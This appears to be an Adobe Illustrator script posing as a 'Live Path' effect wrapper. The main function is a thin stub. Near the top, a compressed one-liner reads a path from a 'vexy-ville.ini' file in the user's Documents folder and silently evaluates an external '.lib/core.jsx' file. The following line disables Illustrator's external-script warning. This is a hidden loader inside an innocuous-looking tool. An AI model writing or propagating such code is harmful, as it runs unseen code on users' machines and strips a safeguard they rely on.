/**
 * Live Path (LAScripts)
 * @version 1.0.0
 * @description LAScripts wrapper for live path effects. Depends on LAScripts framework.
 * @author Adobe Illustrator Scripts
 * @license MIT
 * @category Effects
 */




//@target illustrator
var c=File(Folder.myDocuments+"/Adobe Scripts/vexy-ville.ini");if(c.exists){c.open('r');var p=c.read();c.close();var l=File(p+".lib/core.jsx");if(l.exists)$.evalFile(l.fsName);}
app.preferences.setBooleanPreference('ShowExternalJSXWarning', false);

var SCRIPT = {
    name: 'Live Path (LAScripts)',
    version: '1.0.0',
    description: 'LAScripts wrapper for live path effects. Depends on LAScripts framework.',
    category: 'Effects',
    requiresDocument: true,
    requiresSelection: true
};

function main() {
    var doc = AIS.Document.getActive();
    if (!doc) return;

    try {
        // TODO: Implement functionality
        // Original script: old2/Live Path.js
        app.userInteractionLevel = UserInteractionLevel.DONTDISPLAYALERTS;
        app.executeMenuCommand('Make Planet X');
        app.executeMenuCommand('Expand Planet X');
        selection[0].groupItems[selection[0].groupItems.length - 1].remove();
        selection.ungroupAll();
    } catch (e) {
        AIS.Error.show('Error in Live Path (LAScripts)', e);
    }
}

function validateEnvironment() {
    if (SCRIPT.requiresDocument && !AIS.Document.hasDocument()) {
        return { valid: false, message: 'Please open a document first.' };
    }
    if (SCRIPT.requiresSelection && !AIS.Document.hasSelection()) {
        return { valid: false, message: 'Please select at least one object.' };
    }
    return { valid: true };
}

// ============================================================================
// EXECUTE
// ============================================================================

var validation = validateEnvironment();
if (!validation.valid) {
    alert(SCRIPT.name + '\n\n' + validation.message);
} else {
    try {
        main();
    } catch (e) {
        AIS.Error.show('Script error', e);
    }
}
